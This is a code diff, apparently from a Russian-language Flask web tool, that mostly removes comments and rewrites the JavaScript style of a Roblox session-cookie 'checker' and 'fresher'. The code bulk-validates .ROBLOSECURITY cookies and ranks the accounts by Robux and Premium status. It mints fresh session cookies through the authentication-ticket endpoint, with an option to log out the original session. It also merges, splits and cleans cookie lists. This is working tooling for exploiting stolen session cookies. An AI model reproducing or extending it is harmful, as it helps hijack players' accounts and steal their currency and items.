@@ -72,7 +72,7 @@ def add_to_fresher_history(entry):
     save_history(FRESHER_HISTORY_FILE, history)
 
 # ============================================================
-# ЧЕКЕР - ПОЛНАЯ ИНФОРМАЦИЯ (для одиночной проверки)
+# ЧЕКЕР - ПОЛНАЯ ИНФОРМАЦИЯ
 # ============================================================
 
 def get_full_info(cookie: str) -> dict:
@@ -195,11 +195,10 @@ def get_full_info(cookie: str) -> dict:
     return info
 
 # ============================================================
-# ЧЕКЕР - БЫСТРАЯ МАССОВАЯ ПРОВЕРКА (с сортировкой)
+# ЧЕКЕР - БЫСТРАЯ МАССОВАЯ ПРОВЕРКА
 # ============================================================
 
 def quick_validate_cookie(cookie: str) -> dict:
-    """Быстрая проверка куки с расширенной информацией для сортировки"""
     result = {
         'status': '❌',
         'username': '?',
@@ -285,7 +284,6 @@ def quick_validate_cookie(cookie: str) -> dict:
                 except:
                     pass
                 
-                # Скоринг
                 score = 0
                 if result['robux'] >= 10000: score += 100
                 elif result['robux'] >= 5000: score += 75
@@ -316,7 +314,6 @@ def quick_validate_cookie(cookie: str) -> dict:
     return result
 
 def mass_check_cookies(cookies_list: list, max_workers: int = 10) -> list:
-    """Массовая проверка с сортировкой от лучших к худшим"""
     results = []
     
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
@@ -345,7 +342,6 @@ def mass_check_cookies(cookies_list: list, max_workers: int = 10) -> list:
 # ============================================================
 
 def refresh_roblox_cookie(cookie: str, kill_old: bool = False) -> dict:
-    """Фрешер - генерирует НОВУЮ куку"""
     result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
     
     try:
@@ -364,7 +360,6 @@ def refresh_roblox_cookie(cookie: str, kill_old: bool = False) -> dict:
         
         session.cookies.set('.ROBLOSECURITY', cleaned_cookie, domain='.roblox.com')
         
-        # Проверка валидности
         auth_response = session.get('https://users.roblox.com/v1/users/authenticated', verify=False, timeout=15)
         if auth_response.status_code != 200:
             result['error'] = f"Невалидная кука (HTTP {auth_response.status_code})"
@@ -374,7 +369,6 @@ def refresh_roblox_cookie(cookie: str, kill_old: bool = False) -> dict:
         result['username'] = user_data.get('name', '?')
         result['user_id'] = user_data.get('id', '?')
         
-        # CSRF токен
         csrf_token = None
         try:
             csrf_resp = session.post('https://auth.roblox.com/v2/logout', verify=False, timeout=10)
@@ -388,7 +382,6 @@ def refresh_roblox_cookie(cookie: str, kill_old: bool = False) -> dict:
         
         session.headers['X-CSRF-TOKEN'] = csrf_token
         
-        # Логаут если kill
         if kill_old:
             try:
                 session.post('https://auth.roblox.com/v2/logout', verify=False, timeout=10)
@@ -396,7 +389,6 @@ def refresh_roblox_cookie(cookie: str, kill_old: bool = False) -> dict:
             except:
                 pass
         
-        # Генерация новой куки через authentication-ticket
         new_cookie_value = None
         
         try:
@@ -431,7 +423,6 @@ def refresh_roblox_cookie(cookie: str, kill_old: bool = False) -> dict:
         except:
             pass
         
-        # Проверяем что кука действительно новая и валидная
         if new_cookie_value and new_cookie_value != cleaned_cookie:
             test_session = requests.Session()
             test_session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
@@ -447,7 +438,6 @@ def refresh_roblox_cookie(cookie: str, kill_old: bool = False) -> dict:
                 logger.info(f"✅ НОВАЯ кука для {result['username']}")
                 return result
         
-        # Если не получилось - возвращаем оригинал
         result['new_cookie'] = cleaned_cookie
         result['success'] = True
         
@@ -938,24 +928,22 @@ HTML = r"""<!DOCTYPE html>
     <!-- ЧЕКЕР -->
     <div class="tab-content active" id="tab-checker">
         <div class="checker-grid">
-            <!-- Одиночная проверка -->
             <div class="card">
                 <h2>🔍 Одиночная проверка</h2>
-                <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">Полная информация об аккаунте: Robux, Premium, Gamepasses, безопасность.</p>
-                <textarea id="singleCookie" placeholder="Вставьте ОДИН кук для полной проверки..." rows="3"></textarea>
+                <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">Полная информация об аккаунте</p>
+                <textarea id="singleCookie" placeholder="Вставьте ОДИН кук..." rows="3"></textarea>
                 <div class="mt-12">
-                    <button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">🔍 Проверить аккаунт</button>
+                    <button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">🔍 Проверить</button>
                 </div>
                 <div class="progress-bar"><div class="progress-fill" id="singleProgress"></div></div>
-                <div class="result-box" id="singleResult">Результат появится здесь...</div>
+                <div class="result-box" id="singleResult">Результат здесь...</div>
             </div>
 
-            <!-- Массовая проверка -->
             <div class="card">
                 <h2>📦 Массовая проверка</h2>
-                <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">Быстрая проверка через TXT файл. Сортировка от 👑 лучших к худшим.</p>
+                <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">TXT файл. Сортировка от 👑 к худшим.</p>
                 <div class="upload-area" onclick="document.getElementById('massFile').click()" style="min-height:120px;">
-                    <p>📁 <strong>Загрузить TXT файл с куками</strong></p>
+                    <p>📁 <strong>Загрузить TXT файл</strong></p>
                     <p style="font-size:12px;color:#9880c0;">Каждый кук с новой строки</p>
                 </div>
                 <input type="file" id="massFile" accept=".txt" style="display:none;">
@@ -1000,7 +988,7 @@ HTML = r"""<!DOCTYPE html>
                 <button class="btn btn-secondary" onclick="clearFresherInputs()">🧹 Очистить</button>
             </div>
             <div class="progress-bar"><div class="progress-fill" id="fresherProgress"></div></div>
-            <div class="result-box" id="fresherResult">Новые куки появятся здесь...</div>
+            <div class="result-box" id="fresherResult">Новые куки здесь...</div>
         </div>
         <div class="card history-section">
             <h3>📋 История обновлений <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()">🗑️ Очистить</button></h3>
@@ -1070,23 +1058,23 @@ HTML = r"""<!DOCTYPE html>
 </div>
 
 <script>
-let startTime = Date.now();
-setInterval(() => {
-    let d = Math.floor((Date.now() - startTime) / 1000);
-    let h = String(Math.floor(d / 3600)).padStart(2, '0');
-    let m = String(Math.floor((d % 3600) / 60)).padStart(2, '0');
-    let s = String(d % 60).padStart(2, '0');
-    let el = document.getElementById('sessionTimer');
+var startTime = Date.now();
+setInterval(function() {
+    var d = Math.floor((Date.now() - startTime) / 1000);
+    var h = String(Math.floor(d / 3600)).padStart(2, '0');
+    var m = String(Math.floor((d % 3600) / 60)).padStart(2, '0');
+    var s = String(d % 60).padStart(2, '0');
+    var el = document.getElementById('sessionTimer');
     if (el) el.textContent = '⏱️ ' + h + ':' + m + ':' + s;
 }, 1000);
 
-document.querySelectorAll('.tab').forEach(tab => {
+document.querySelectorAll('.tab').forEach(function(tab) {
     tab.addEventListener('click', function() {
-        let tabId = this.getAttribute('data-tab');
-        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+        var tabId = this.getAttribute('data-tab');
+        document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+        document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });
         this.classList.add('active');
-        let target = document.getElementById('tab-' + tabId);
+        var target = document.getElementById('tab-' + tabId);
         if (target) target.classList.add('active');
         if (tabId === 'checker') loadCheckerHistory();
         if (tabId === 'fresher') loadFresherHistory();
@@ -1101,7 +1089,7 @@ function setFresherMode(mode) {
 
 document.getElementById('fresherFile').addEventListener('change', function(e) {
     if (this.files && this.files[0]) {
-        let reader = new FileReader();
+        var reader = new FileReader();
         reader.onload = function(evt) { document.getElementById('fresherCookies').value = evt.target.result; };
         reader.readAsText(this.files[0]);
     }
@@ -1109,19 +1097,19 @@ document.getElementById('fresherFile').addEventListener('change', function(e) {
 
 document.getElementById('massFile').addEventListener('change', function(e) {
     if (this.files && this.files[0]) {
-        document.getElementById('massFileInfo').textContent = '✅ ' + this.files[0].name + ' (' + (this.files[0].size/1024).toFixed(1) + ' KB)';
-        let reader = new FileReader();
+        document.getElementById('massFileInfo').textContent = '✅ ' + this.files[0].name;
+        var reader = new FileReader();
         reader.onload = function(evt) { window.massFileContent = evt.target.result; };
         reader.readAsText(this.files[0]);
     }
 });
 
 document.getElementById('mergeFiles').addEventListener('change', function(e) {
-    let list = document.getElementById('mergeFileList');
+    var list = document.getElementById('mergeFileList');
     list.innerHTML = '';
     if (this.files) {
-        Array.from(this.files).forEach((f, i) => {
-            let div = document.createElement('div');
+        Array.from(this.files).forEach(function(f, i) {
+            var div = document.createElement('div');
             div.className = 'file-item';
             div.textContent = (i+1) + '. ' + f.name;
             list.appendChild(div);
@@ -1131,7 +1119,7 @@ document.getElementById('mergeFiles').addEventListener('change', function(e) {
 
 document.getElementById('splitCountFile').addEventListener('change', function(e) {
     if (this.files && this.files[0]) {
-        let reader = new FileReader();
+        var reader = new FileReader();
         reader.onload = function(evt) { window.splitCountContent = evt.target.result; };
         reader.readAsText(this.files[0]);
     }
@@ -1139,130 +1127,102 @@ document.getElementById('splitCountFile').addEventListener('change', function(e)
 
 document.getElementById('splitFilesFile').addEventListener('change', function(e) {
     if (this.files && this.files[0]) {
-        let reader = new FileReader();
+        var reader = new FileReader();
         reader.onload = function(evt) { window.splitFilesContent = evt.target.result; };
         reader.readAsText(this.files[0]);
     }
 });
 
-// ===== ОДИНОЧНАЯ ПРОВЕРКА =====
 async function runSingleCheck() {
-    let resBox = document.getElementById('singleResult');
-    let cookie = document.getElementById('singleCookie').value.trim();
-    let progress = document.getElementById('singleProgress');
+    var resBox = document.getElementById('singleResult');
+    var cookie = document.getElementById('singleCookie').value.trim();
+    var progress = document.getElementById('singleProgress');
     if (!cookie) { resBox.textContent = '❌ Вставьте кук!'; return; }
     resBox.textContent = '⏳ Проверка...';
     progress.style.width = '30%';
     try {
-        let r = await fetch('/api/single-check', {
+        var r = await fetch('/api/single-check', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ cookie: cookie })
         });
-        let d = await r.json();
+        var d = await r.json();
         progress.style.width = '100%';
-        setTimeout(() => { progress.style.width = '0%'; }, 1000);
-        if (d.success) {
-            resBox.textContent = d.report;
-            loadCheckerHistory();
-        } else {
-            resBox.textContent = '❌ ' + (d.message || 'Ошибка');
-        }
-    } catch(e) {
-        resBox.textContent = '❌ ' + e.message;
-        progress.style.width = '0%';
-    }
+        setTimeout(function() { progress.style.width = '0%'; }, 1000);
+        if (d.success) { resBox.textContent = d.report; loadCheckerHistory(); }
+        else { resBox.textContent = '❌ ' + (d.message || 'Ошибка'); }
+    } catch(e) { resBox.textContent = '❌ ' + e.message; progress.style.width = '0%'; }
 }
 
-// ===== МАССОВАЯ ПРОВЕРКА =====
 async function runMassCheck() {
-    let resBox = document.getElementById('massResult');
-    let progress = document.getElementById('massProgress');
-    let content = window.massFileContent;
+    var resBox = document.getElementById('massResult');
+    var progress = document.getElementById('massProgress');
+    var content = window.massFileContent;
     if (!content) { resBox.textContent = '❌ Загрузите TXT файл!'; return; }
     resBox.textContent = '⏳ Массовая проверка...';
     progress.style.width = '20%';
     try {
-        let fd = new FormData();
+        var fd = new FormData();
         fd.append('file', new Blob([content], { type: 'text/plain' }), 'mass_check.txt');
-        let r = await fetch('/api/mass-check', { method: 'POST', body: fd });
-        let d = await r.json();
+        var r = await fetch('/api/mass-check', { method: 'POST', body: fd });
+        var d = await r.json();
         progress.style.width = '100%';
-        setTimeout(() => { progress.style.width = '0%'; }, 1000);
+        setTimeout(function() { progress.style.width = '0%'; }, 1000);
         if (d.success) {
-            let html = '📊 Всего: ' + d.total + ' | ✅ ' + d.valid_count + ' | ❌ ' + d.invalid_count + '\n';
-            html += '💠 Premium: ' + (d.premium_count || 0) + ' | 💰 Robux: ⏣ ' + (d.total_robux || 0).toLocaleString() + '\n\n';
+            var html = '📊 Всего: ' + d.total + ' | ✅ ' + d.valid_count + ' | ❌ ' + d.invalid_count + '\n';
+            html += '💠 Premium: ' + (d.premium_count || 0) + ' | 💰 Robux: ' + (d.total_robux || 0).toLocaleString() + '\n\n';
             html += '══════ 🏆 ОТ ЛУЧШИХ К ХУДШИМ ══════\n\n';
-            for (let line of d.results) html += line + '\n';
-            if (d.download_url) html += '\n📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать отчет</a>';
+            for (var i = 0; i < d.results.length; i++) { html += d.results[i] + '\n'; }
+            if (d.download_url) { html += '\n📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать отчет</a>'; }
             resBox.innerHTML = html;
             loadCheckerHistory();
-        } else {
-            resBox.textContent = '❌ ' + (d.message || 'Ошибка');
-        }
-    } catch(e) {
-        resBox.textContent = '❌ ' + e.message;
-        progress.style.width = '0%';
-    }
+        } else { resBox.textContent = '❌ ' + (d.message || 'Ошибка'); }
+    } catch(e) { resBox.textContent = '❌ ' + e.message; progress.style.width = '0%'; }
 }
 
-// ===== ФРЕШЕР =====
 async function runFresher() {
-    let resBox = document.getElementById('fresherResult');
-    let cookies = document.getElementById('fresherCookies').value.trim();
-    let mode = document.getElementById('fresherMode').value;
-    let progress = document.getElementById('fresherProgress');
+    var resBox = document.getElementById('fresherResult');
+    var cookies = document.getElementById('fresherCookies').value.trim();
+    var mode = document.getElementById('fresherMode').value;
+    var progress = document.getElementById('fresherProgress');
     if (!cookies) { resBox.textContent = '❌ Вставьте куки!'; return; }
     resBox.textContent = '⏳ Обновление...';
     progress.style.width = '30%';
     try {
-        let r = await fetch('/api/fresher', {
+        var r = await fetch('/api/fresher', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ cookies: cookies, mode: mode })
         });
-        let d = await r.json();
+        var d = await r.json();
         progress.style.width = '100%';
-        setTimeout(() => { progress.style.width = '0%'; }, 1000);
-        if (d.success && d.only_cookies) {
-            // Показываем ТОЛЬКО чистые куки
-            resBox.textContent = d.only_cookies;
-            loadFresherHistory();
-        } else {
-            resBox.textContent = '❌ ' + (d.message || 'Не удалось обновить');
-        }
-    } catch(e) {
-        resBox.textContent = '❌ ' + e.message;
-        progress.style.width = '0%';
-    }
+        setTimeout(function() { progress.style.width = '0%'; }, 1000);
+        if (d.success && d.only_cookies) { resBox.textContent = d.only_cookies; loadFresherHistory(); }
+        else { resBox.textContent = '❌ ' + (d.message || 'Не удалось обновить'); }
+    } catch(e) { resBox.textContent = '❌ ' + e.message; progress.style.width = '0%'; }
 }
 
 function clearFresherInputs() {
     document.getElementById('fresherCookies').value = '';
-    document.getElementById('fresherResult').textContent = 'Новые куки появятся здесь...';
+    document.getElementById('fresherResult').textContent = 'Новые куки здесь...';
 }
 
-// ===== ИСТОРИЯ =====
 async function loadCheckerHistory() {
-    let container = document.getElementById('checkerHistoryList');
+    var container = document.getElementById('checkerHistoryList');
     try {
-        let r = await fetch('/api/history/checker');
-        let d = await r.json();
+        var r = await fetch('/api/history/checker');
+        var d = await r.json();
         if (d.history && d.history.length > 0) {
-            let html = '';
-            d.history.slice().reverse().forEach(item => {
-                let typeLabel = item.type === 'mass' ? '📦 Массовая' : '🔍 Одиночная';
-                html += '<div class="history-item" onclick="let det=this.querySelector(\'.hist-detail\');det.style.display=det.style.display===\'none\'?\'block\':\'none\'">';
+            var html = '';
+            d.history.slice().reverse().forEach(function(item) {
+                var typeLabel = item.type === 'mass' ? '📦 Массовая' : '🔍 Одиночная';
+                html += '<div class="history-item" onclick="var det=this.querySelector(\'.hist-detail\');det.style.display=det.style.display===\'none\'?\'block\':\'none\'">';
                 html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">' + typeLabel + ' | ✅ ' + item.valid + '/' + item.total + '</span></div>';
                 html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n───\n') : 'Нет данных') + '</div></div>';
             });
             container.innerHTML = html;
-        } else {
-            container.innerHTML = '<div class="empty-history">📭 История пуста</div>';
-        }
-    } catch(e) {
-        container.innerHTML = '<div class="empty-history">❌ Ошибка</div>';
-    }
+        } else { container.innerHTML = '<div class="empty-history">📭 История пуста</div>'; }
+    } catch(e) { container.innerHTML = '<div class="empty-history">❌ Ошибка</div>'; }
 }
 
 async function clearCheckerHistory() {
@@ -1272,25 +1232,21 @@ async function clearCheckerHistory() {
 }
 
 async function loadFresherHistory() {
-    let container = document.getElementById('fresherHistoryList');
+    var container = document.getElementById('fresherHistoryList');
     try {
-        let r = await fetch('/api/history/fresher');
-        let d = await r.json();
+        var r = await fetch('/api/history/fresher');
+        var d = await r.json();
         if (d.history && d.history.length > 0) {
-            let html = '';
-            d.history.slice().reverse().forEach(item => {
-                let ml = item.mode === 'kill' ? '💀 Сброс' : '♻️ Дублирование';
-                html += '<div class="history-item" onclick="let det=this.querySelector(\'.hist-detail\');det.style.display=det.style.display===\'none\'?\'block\':\'none\'">';
+            var html = '';
+            d.history.slice().reverse().forEach(function(item) {
+                var ml = item.mode === 'kill' ? '💀 Сброс' : '♻️ Дублирование';
+                html += '<div class="history-item" onclick="var det=this.querySelector(\'.hist-detail\');det.style.display=det.style.display===\'none\'?\'block\':\'none\'">';
                 html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">' + ml + ' | ' + item.refreshed_count + ' шт.</span></div>';
                 html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n') : 'Нет данных') + '</div></div>';
             });
             container.innerHTML = html;
-        } else {
-            container.innerHTML = '<div class="empty-history">📭 История пуста</div>';
-        }
-    } catch(e) {
-        container.innerHTML = '<div class="empty-history">❌ Ошибка</div>';
-    }
+        } else { container.innerHTML = '<div class="empty-history">📭 История пуста</div>'; }
+    } catch(e) { container.innerHTML = '<div class="empty-history">❌ Ошибка</div>'; }
 }
 
 async function clearFresherHistory() {
@@ -1299,83 +1255,71 @@ async function clearFresherHistory() {
     loadFresherHistory();
 }
 
-// ===== ИНСТРУМЕНТЫ =====
 async function mergeCookies() {
-    let files = document.getElementById('mergeFiles').files;
+    var files = document.getElementById('mergeFiles').files;
     if (!files || files.length < 2) { document.getElementById('mergeResult').textContent = '❌ Минимум 2 файла'; return; }
-    let fd = new FormData();
-    Array.from(files).forEach(f => fd.append('files', f));
+    var fd = new FormData();
+    Array.from(files).forEach(function(f) { fd.append('files', f); });
     document.getElementById('mergeResult').textContent = '⏳ Объединение...';
     try {
-        let r = await fetch('/api/merge-cookies', { method: 'POST', body: fd });
-        let d = await r.json();
-        if (d.success) {
-            document.getElementById('mergeResult').innerHTML = '✅ ' + d.total_files + ' файлов | 📊 ' + d.total_cookies + ' куки | 🗑️ -' + d.duplicates_removed + '<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать</a>';
-        } else {
-            document.getElementById('mergeResult').textContent = '❌ ' + (d.message || 'Ошибка');
-        }
+        var r = await fetch('/api/merge-cookies', { method: 'POST', body: fd });
+        var d = await r.json();
+        if (d.success) { document.getElementById('mergeResult').innerHTML = '✅ ' + d.total_files + ' файлов | 📊 ' + d.total_cookies + ' куки<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать</a>'; }
+        else { document.getElementById('mergeResult').textContent = '❌ ' + (d.message || 'Ошибка'); }
     } catch(e) { document.getElementById('mergeResult').textContent = '❌ ' + e.message; }
 }
 
 async function splitByCount() {
-    let content = window.splitCountContent;
-    let count = parseInt(document.getElementById('splitCount').value);
+    var content = window.splitCountContent;
+    var count = parseInt(document.getElementById('splitCount').value);
     if (!content) { document.getElementById('splitCountResult').textContent = '❌ Загрузите файл'; return; }
     document.getElementById('splitCountResult').textContent = '⏳ Разделение...';
     try {
-        let r = await fetch('/api/split-cookies', {
+        var r = await fetch('/api/split-cookies', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ content: content, split_type: 'count', count: count })
         });
-        let d = await r.json();
-        if (d.success) {
-            document.getElementById('splitCountResult').innerHTML = '✅ ' + d.file_count + ' файлов | 📊 ' + d.total_cookies + ' куки<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>';
-        } else {
-            document.getElementById('splitCountResult').textContent = '❌ ' + (d.message || 'Ошибка');
-        }
+        var d = await r.json();
+        if (d.success) { document.getElementById('splitCountResult').innerHTML = '✅ ' + d.file_count + ' файлов | 📊 ' + d.total_cookies + ' куки<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>'; }
+        else { document.getElementById('splitCountResult').textContent = '❌ ' + (d.message || 'Ошибка'); }
     } catch(e) { document.getElementById('splitCountResult').textContent = '❌ ' + e.message; }
 }
 
 async function splitByFiles() {
-    let content = window.splitFilesContent;
-    let num = parseInt(document.getElementById('splitFilesCount').value);
+    var content = window.splitFilesContent;
+    var num = parseInt(document.getElementById('splitFilesCount').value);
     if (!content) { document.getElementById('splitFilesResult').textContent = '❌ Загрузите файл'; return; }
     document.getElementById('splitFilesResult').textContent = '⏳ Разделение...';
     try {
-        let r = await fetch('/api/split-cookies', {
+        var r = await fetch('/api/split-cookies', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ content: content, split_type: 'files', count: num })
         });
-        let d = await r.json();
-        if (d.success) {
-            document.getElementById('splitFilesResult').innerHTML = '✅ ' + num + ' файлов | 📊 ' + d.total_cookies + ' куки<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>';
-        } else {
-            document.getElementById('splitFilesResult').textContent = '❌ ' + (d.message || 'Ошибка');
-        }
+        var d = await r.json();
+        if (d.success) { document.getElementById('splitFilesResult').innerHTML = '✅ ' + num + ' файлов | 📊 ' + d.total_cookies + ' куки<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>'; }
+        else { document.getElementById('splitFilesResult').textContent = '❌ ' + (d.message || 'Ошибка'); }
     } catch(e) { document.getElementById('splitFilesResult').textContent = '❌ ' + e.message; }
 }
 
 async function cleanCookies(action) {
-    let content = document.getElementById('cleanCookiesInput').value.trim();
+    var content = document.getElementById('cleanCookiesInput').value.trim();
     if (!content) { document.getElementById('cleanResult').textContent = '❌ Вставьте куки'; return; }
     document.getElementById('cleanResult').textContent = '⏳ Обработка...';
     try {
-        let r = await fetch('/api/clean-cookies', {
+        var r = await fetch('/api/clean-cookies', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ content: content, action: action })
         });
-        let d = await r.json();
+        var d = await r.json();
         if (d.success) {
-            let txt = '✅ Было: ' + d.original_count + ' | Стало: ' + d.processed_count;
+            var txt = '✅ Было: ' + d.original_count + ' | Стало: ' + d.processed_count;
             if (d.duplicates_removed > 0) txt += '<br>🗑️ Удалено: ' + d.duplicates_removed;
             txt += '<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать</a>';
             document.getElementById('cleanResult').innerHTML = txt;
-        } else {
-            document.getElementById('cleanResult').textContent = '❌ ' + (d.message || 'Ошибка');
-        }
+        } else { document.getElementById('cleanResult').textContent = '❌ ' + (d.message || 'Ошибка'); }
     } catch(e) { document.getElementById('cleanResult').textContent = '❌ ' + e.message; }
 }
 
@@ -1454,7 +1398,6 @@ def api_mass_check():
             score = r.get('score', 0)
             rank = "👑" if score >= 150 else ("💎" if score >= 100 else ("⭐" if score >= 60 else ("🟢" if score >= 30 else "🔹")))
             f.write(f"{rank} {r['username']} [{r['user_id']}] | ⏣ {r['robux']:,} | Score: {score}\n")
-            f.write(f"   Premium: {'✅' if r.get('is_premium') else '❌'} | Создан: {r['created']}\n")
             f.write(f"   Cookie: {r['cookie']}\n\n")
         
         if invalid_results:
@@ -1502,11 +1445,7 @@ def api_fresher():
         if result['success'] and result['new_cookie']:
             new_cookie = result['new_cookie']
             username = result.get('username', '?')
-            
-            # В историю
             cookie_hist.append(f"🟢 {username} - НОВАЯ: {new_cookie[:60]}...")
-            
-            # В результат ТОЛЬКО чистая кука
             only_cookies.append(new_cookie)
         else:
             cookie_hist.append(f"❌ Ошибка: {c[:50]}...")
